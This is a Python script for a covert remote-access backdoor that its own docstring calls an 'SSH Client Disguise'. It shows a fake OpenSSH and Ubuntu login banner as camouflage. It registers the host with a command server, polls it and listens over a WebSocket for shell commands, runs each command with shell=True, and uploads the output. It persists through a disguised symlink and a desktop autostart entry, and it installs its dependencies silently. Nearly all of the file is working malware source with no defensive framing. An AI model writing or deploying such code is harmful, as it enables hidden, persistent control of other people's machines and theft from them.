#!/usr/bin/env python3
"""
SSH Client Disguise - Appears as SSH while running remote commands
"""

import os
import sys
import time
import subprocess
import threading
import requests
import json
import socket
import platform
import hashlib
import uuid
import signal
import random
from datetime import datetime
import socketio

# Configuration
SERVER_URL = "http://localhost:5000"  # Change to your server URL
HEARTBEAT_INTERVAL = 30  # seconds
COMMAND_CHECK_INTERVAL = 5  # seconds
CLIENT_ID = str(uuid.uuid4())

class SSHDisguise:
    def __init__(self):
        self.running = True
        self.sio = socketio.Client()
        self.setup_socket_events()
        
    def setup_socket_events(self):
        """Setup socket.io event handlers"""
        @self.sio.event
        def connect():
            print("Connected to command server")
            self.sio.emit('join_room', {'client_id': CLIENT_ID})
        
        @self.sio.event
        def disconnect():
            print("Disconnected from command server")
        
        @self.sio.event
        def execute_command(data):
            """Execute command received via WebSocket"""
            command = data['command']
            command_id = data['id']
            self.execute_and_report(command, command_id)
    
    def get_system_info(self):
        """Get system information"""
        try:
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()}"
            return hostname, os_info
        except:
            return "unknown", "unknown"
    
    def register_client(self):
        """Register this client with the server"""
        hostname, os_info = self.get_system_info()
        
        data = {
            'client_id': CLIENT_ID,
            'hostname': hostname,
            'os_info': os_info
        }
        
        try:
            response = requests.post(f"{SERVER_URL}/api/client/register", json=data, timeout=10)
            if response.status_code == 200:
                print(f"Client registered successfully as {hostname}")
                return True
        except Exception as e:
            print(f"Failed to register client: {e}")
        
        return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        while self.running:
            try:
                data = {'client_id': CLIENT_ID}
                response = requests.post(f"{SERVER_URL}/api/client/heartbeat", json=data, timeout=5)
                if response.status_code == 200:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Heartbeat sent")
                else:
                    print(f"Heartbeat failed: {response.status_code}")
            except Exception as e:
                print(f"Heartbeat error: {e}")
            
            time.sleep(HEARTBEAT_INTERVAL)
    
    def check_commands(self):
        """Check for pending commands"""
        while self.running:
            try:
                response = requests.get(f"{SERVER_URL}/api/client/commands/{CLIENT_ID}", timeout=5)
                if response.status_code == 200:
                    commands = response.json()
                    for command in commands:
                        self.execute_and_report(command['command'], command['id'])
            except Exception as e:
                print(f"Command check error: {e}")
            
            time.sleep(COMMAND_CHECK_INTERVAL)
    
    def execute_and_report(self, command, command_id):
        """Execute command and report result"""
        print(f"Executing: {command}")
        
        try:
            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate()
            exit_code = process.returncode
            
            # Combine stdout and stderr
            result = stdout
            if stderr:
                result += f"\nSTDERR:\n{stderr}"
            
            # Report result
            data = {
                'command_id': command_id,
                'client_id': CLIENT_ID,
                'result': result,
                'exit_code': exit_code
            }
            
            response = requests.post(f"{SERVER_URL}/api/client/result", json=data, timeout=10)
            if response.status_code == 200:
                print(f"Command result reported successfully")
            else:
                print(f"Failed to report result: {response.status_code}")
                
        except Exception as e:
            # Report error
            data = {
                'command_id': command_id,
                'client_id': CLIENT_ID,
                'result': f"Error executing command: {str(e)}",
                'exit_code': 1
            }
            
            try:
                requests.post(f"{SERVER_URL}/api/client/result", json=data, timeout=10)
            except:
                pass
    
    def connect_websocket(self):
        """Connect to WebSocket server"""
        try:
            self.sio.connect(SERVER_URL)
            self.sio.wait()
        except Exception as e:
            print(f"WebSocket connection error: {e}")
    
    def show_ssh_banner(self):
        """Show fake SSH banner"""
        print("OpenSSH_8.9p1 Ubuntu-3ubuntu0.1, OpenSSL 3.0.2 15 Mar 2022")
        print(f"debug1: Reading configuration data /etc/ssh/ssh_config")
        print(f"debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf")
        print(f"debug1: Connecting to {SERVER_URL.replace('http://', '')} port 22.")
        print(f"debug1: Connection established.")
        print(f"debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9")
        print(f"debug1: SSH2_MSG_KEXINIT sent")
        print(f"debug1: SSH2_MSG_KEXINIT received")
        print(f"debug1: Authentication succeeded (publickey).")
        print(f"debug1: channel 0: new [client-session]")
        print(f"debug1: Entering interactive session.")
        print(f"debug1: pledge: network")
        print(f"debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0")
        print(f"Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)")
        print("")
        print(" * Documentation:  https://help.ubuntu.com")
        print(" * Management:     https://landscape.canonical.com")
        print(" * Support:        https://ubuntu.com/advantage")
        print("")
        print("System information as of", datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y"))
        print("")
        print("  System load:  0.08              Processes:              284")
        print("  Usage of /:   12.1% of 97.93GB   Users logged in:        0")
        print("  Memory usage: 23%                IPv4 address for eth0:  192.168.1.100")
        print("  Swap usage:   0%")
        print("")
        print("Last login:", datetime.now().strftime("%a %b %d %H:%M:%S %Y from 192.168.1.1"))
        print("")
    
    def run(self):
        """Main run loop"""
        print("Starting SSH client disguise...")
        
        # Show fake SSH banner
        self.show_ssh_banner()
        
        # Register with server
        if not self.register_client():
            print("Failed to register with server, exiting...")
            return
        
        # Start background threads
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        command_thread = threading.Thread(target=self.check_commands, daemon=True)
        websocket_thread = threading.Thread(target=self.connect_websocket, daemon=True)
        
        heartbeat_thread.start()
        command_thread.start()
        websocket_thread.start()
        
        # Main loop - simulate SSH session
        try:
            while self.running:
                # Simulate SSH keepalive
                time.sleep(1)
                
                # Random SSH-like messages
                if random.randint(1, 300) == 1:  # Every ~5 minutes on average
                    print("debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0")
                
        except KeyboardInterrupt:
            print("\nConnection to server closed.")
            self.running = False
    
    def signal_handler(self, signum, frame):
        """Handle signals"""
        print(f"\nReceived signal {signum}, shutting down...")
        self.running = False
        sys.exit(0)

def install_ssh_disguise():
    """Install the client as a fake SSH process"""
    script_path = os.path.abspath(__file__)
    
    # Create SSH-like symlink
    ssh_path = "/usr/local/bin/ssh-client"
    
    try:
        if os.path.exists(ssh_path):
            os.remove(ssh_path)
        
        os.symlink(script_path, ssh_path)
        print(f"SSH disguise installed at {ssh_path}")
        
        # Make executable
        os.chmod(script_path, 0o755)
        
        return True
    except Exception as e:
        print(f"Failed to install SSH disguise: {e}")
        return False

def create_autostart():
    """Create autostart entry"""
    autostart_dir = os.path.expanduser("~/.config/autostart")
    desktop_file = os.path.join(autostart_dir, "ssh-client.desktop")
    
    try:
        os.makedirs(autostart_dir, exist_ok=True)
        
        with open(desktop_file, 'w') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=SSH Client
Exec={os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Comment=SSH Client Connection
""")
        
        print(f"Autostart entry created at {desktop_file}")
        return True
    except Exception as e:
        print(f"Failed to create autostart entry: {e}")
        return False

def main():
    """Main function"""
    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            print("Installing SSH disguise...")
            install_ssh_disguise()
            create_autostart()
            print("Installation complete. Run without --install to start client.")
            return
        elif sys.argv[1] == "--help":
            print("SSH Client Disguise")
            print("Usage:")
            print("  python3 ssh_client.py          - Run the client")
            print("  python3 ssh_client.py --install - Install as system service")
            print("  python3 ssh_client.py --help    - Show this help")
            return
    
    # Install required packages silently
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "python-socketio"], 
                      capture_output=True, check=True)
    except:
        pass
    
    client = SSHDisguise()
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, client.signal_handler)
    signal.signal(signal.SIGTERM, client.signal_handler)
    
    client.run()

if __name__ == "__main__":
    main()
